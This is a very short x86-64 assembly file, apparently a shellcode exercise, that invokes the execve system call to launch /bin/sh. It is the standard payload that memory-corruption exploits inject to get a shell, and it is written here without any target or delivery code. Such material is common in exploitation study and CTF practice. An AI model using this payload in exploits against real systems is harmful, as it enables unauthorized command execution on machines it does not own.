#shell code
.intel_syntax noprefix
.globl _start
.section .text
_start:
	mov	rax, 59
	lea	rdi, [rip+binsh]
	mov	rsi, 0
	mov	rdx, 0
	syscall
#.section .data
binsh:	.string "/bin/sh"
